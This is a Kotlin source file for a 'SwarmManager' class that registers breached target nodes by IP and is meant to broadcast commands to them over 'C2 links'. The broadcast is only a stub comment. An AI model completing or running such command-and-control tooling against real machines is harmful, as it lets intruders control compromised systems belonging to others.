package com.spartanai.nova.core

import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow

/**
 * Swarm Orchestrator
 * Mandate: Unified management of multiple breached target nodes.
 */
class SwarmManager(private val orchestrator: NovaOrchestrator) {

    data class SwarmNode(
        val id: String,
        val ip: String,
        val type: String,
        val status: String = "ACTIVE",
        val lastSeen: Long = System.currentTimeMillis()
    )

    private val _activeNodes = MutableStateFlow<List<SwarmNode>>(emptyList())
    val activeNodes = _activeNodes.asStateFlow()

    fun addNode(node: SwarmNode) {
        val current = _activeNodes.value.toMutableList()
        if (current.none { it.ip == node.ip }) {
            current.add(node)
            _activeNodes.value = current
            orchestrator.addOutput("[SWARM]: New node joined: ${node.ip} (${node.type})")
            orchestrator.speak("New swarm node established.")
        }
    }

    fun distributeTask(command: String) {
        orchestrator.addOutput("[SWARM]: Broadcasting task to ${_activeNodes.value.size} nodes: $command")
        // Logic to send command to all established C2 links
    }
}
